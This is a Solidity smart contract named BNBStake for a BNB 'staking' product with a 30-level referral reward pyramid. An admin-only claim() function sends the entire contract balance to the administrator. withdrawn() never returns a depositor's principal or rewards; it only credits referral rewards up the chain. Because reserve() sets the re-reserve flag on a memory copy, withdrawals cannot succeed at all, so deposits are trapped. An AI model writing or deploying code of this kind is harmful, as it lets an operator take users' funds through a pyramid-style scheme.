// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/utils/math/SafeMathUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/math/MathUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol";


contract BNBStake is Initializable, ReentrancyGuardUpgradeable, AccessControlUpgradeable {
    using SafeMathUpgradeable for uint;

    bytes32 public constant AUDITOR_ROLE = keccak256("AUDITOR_ROLE");


    function initialize() initializer public {
        __ReentrancyGuard_init();
        __AccessControl_init();
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(AUDITOR_ROLE, msg.sender);

        _initProduct();
    }

    mapping(uint => mapping(uint => uint)) dayToAmountToRewardRate;

    function _initProduct() internal {
        dayToAmountToRewardRate[1][5 * 1e15] = 35;
        dayToAmountToRewardRate[1][1 * 1e16] = 70;
        dayToAmountToRewardRate[1][3 * 1e16] = 70;
        dayToAmountToRewardRate[1][5 * 1e16] = 84;
        dayToAmountToRewardRate[1][10 * 1e16] = 105;

//        dayToAmountToRewardRate[7][5 * 1e17] = 35;
//        dayToAmountToRewardRate[7][1 * 1e18] = 70;
//        dayToAmountToRewardRate[7][3 * 1e18] = 70;
//        dayToAmountToRewardRate[7][5 * 1e18] = 84;
//        dayToAmountToRewardRate[7][10 * 1e18] = 105;
    }


    struct Deposit {
        uint duration;
        uint paidAmount;
        uint totalAmount;
        uint rewards;
        uint contractTime;
        uint createTime;
        uint finishTime;
        bool finished;
        bool isReReserved;
    }

    struct User {
        address upline;
        Deposit[] deposits;
        address[] reffers;
        uint level;

        uint unClaimedRefferRewards;
        uint winthdrawnClaimedRefferRewards;
        mapping(uint => uint) refferLevelToCount;
        uint teamLevel1Count;

    }

    mapping(address => User) public users;


    function reserve(uint duration_, address up) external payable {
        User storage user = users[msg.sender];
        uint _totalAmount = msg.value * 100 / 20;
        require(dayToAmountToRewardRate[duration_][_totalAmount] > 0, 'amount wrong');


        Deposit[] memory usersDeposits = user.deposits;

        for (uint i = 0; i < usersDeposits.length; i++) {
            if (!usersDeposits[i].finished) {
                require(usersDeposits[i].totalAmount * 20 / 100 != msg.value && usersDeposits[i].isReReserved == false, 'repeat');

                if (usersDeposits[i].totalAmount * 20 / 100 == msg.value
                && usersDeposits[i].contractTime > 0
                    && block.timestamp >= (usersDeposits[i].contractTime + (usersDeposits[i].duration * 1 days))) {
                    usersDeposits[i].isReReserved = true;
                }
            }
        }

        user.deposits.push(Deposit({
        duration : duration_,
        paidAmount : msg.value,
        totalAmount : msg.value * 5,
        rewards : 0,
        contractTime : 0,
        createTime : block.timestamp,
        finishTime : 0,
        finished : false,
        isReReserved : false
        }));


        if (user.level == 0) {
            require(up != address(0) && up != msg.sender && users[up].upline != msg.sender, 'refferr wallet wrong');
            user.upline = up;
            users[up].reffers.push(msg.sender);
            update(msg.sender, 1);
            address _up = up;
            for (uint i; i < 30; i++) {
                if (_up == address(0)) {
                    break;
                }
                users[_up].teamLevel1Count++;

                if (users[_up].refferLevelToCount[5] > 0 && users[_up].level == 5) {
                    update(_up, 6);
                } else if (users[_up].refferLevelToCount[2] >= 5) {
                    update(_up, 5);
                } else if (users[_up].refferLevelToCount[2] >= 4) {
                    update(_up, 4);
                } else if (users[_up].refferLevelToCount[2] >= 3) {
                    update(_up, 3);
                } else if (users[_up].refferLevelToCount[1] >= 3 && users[_up].teamLevel1Count >= 10) {
                    update(_up, 2);
                }
                _up = users[_up].upline;
            }
        }


    }


    function update(address addr, uint level) private {
        users[addr].level = level;
        if (address(0) != users[addr].upline) {
            users[users[addr].upline].refferLevelToCount[level]++;
        }

    }


    function contracted(uint dopIndex) external payable{
        Deposit storage dop = users[msg.sender].deposits[dopIndex];

        require(dop.contractTime == 0, 'contracted');
        require(dop.paidAmount == (dop.totalAmount * 20 / 100) && msg.value == (dop.totalAmount * 80 / 100), 'contracted wrong');
        require(block.timestamp <= (dop.createTime + 10 days), 'contract expired');

        dop.paidAmount += msg.value;
        dop.contractTime = block.timestamp;
    }

    function claim() external onlyRole(DEFAULT_ADMIN_ROLE){
        payable(msg.sender).transfer(address(this).balance);

    }


    function withdrawn(uint dopIndex) external nonReentrant{
        Deposit storage dop = users[msg.sender].deposits[dopIndex];
        require(!dop.finished, 'dop finished');
        require(dop.isReReserved, 'dop has not reReserved');
        require(block.timestamp >= (dop.contractTime + (dop.duration * 1 days)), 'dop has not reReserved');
        uint _rewards = dop.paidAmount * dayToAmountToRewardRate[dop.duration][dop.paidAmount] / 1000;
        dop.rewards = _rewards;
        updateUplineRewards(msg.sender, _rewards);
        dop.finished = true;
        dop.finishTime = block.timestamp;
    }

    function withdrawnUnClaimedRefferRewards() external nonReentrant{
        require(users[msg.sender].unClaimedRefferRewards > 0, 'no unClaimedRefferRewards');
        users[msg.sender].winthdrawnClaimedRefferRewards += users[msg.sender].unClaimedRefferRewards;
        payable(msg.sender).transfer(users[msg.sender].unClaimedRefferRewards);
        users[msg.sender].unClaimedRefferRewards = 0;
    }


    function updateUplineRewards(address addr_, uint _rewards) private {
        address upline = users[addr_].upline;
        for (uint i; i < 30; i++) {
            if (upline == address(0)) {
                break;
            }

            if (users[upline].level > i && i == 0) {
                users[upline].unClaimedRefferRewards += _rewards;
            }
            if (users[upline].level > i && i == 1) {
                users[upline].unClaimedRefferRewards += (_rewards * 40 / 100);
            }
            if (users[upline].level > i && i == 2) {
                users[upline].unClaimedRefferRewards += (_rewards * 20 / 100);
            }
            if (users[upline].level > i && i == 3) {
                users[upline].unClaimedRefferRewards += (_rewards * 2 / 100);
            }
            if (users[upline].level >= 5 && i > 3) {
                users[upline].unClaimedRefferRewards += (_rewards * 2 / 100);
            }
            upline = users[upline].upline;
        }


    }

    function getDeposit(address addr_, uint dopIndex) public view returns (Deposit memory){
        return users[addr_].deposits[dopIndex];
    }

    function getDeposits(address addr_) public view returns (Deposit [] memory){
        return users[addr_].deposits;
    }

    function userReffers(address addr_) public view returns(address[] memory reffers){
        reffers = users[addr_].reffers;
    }



}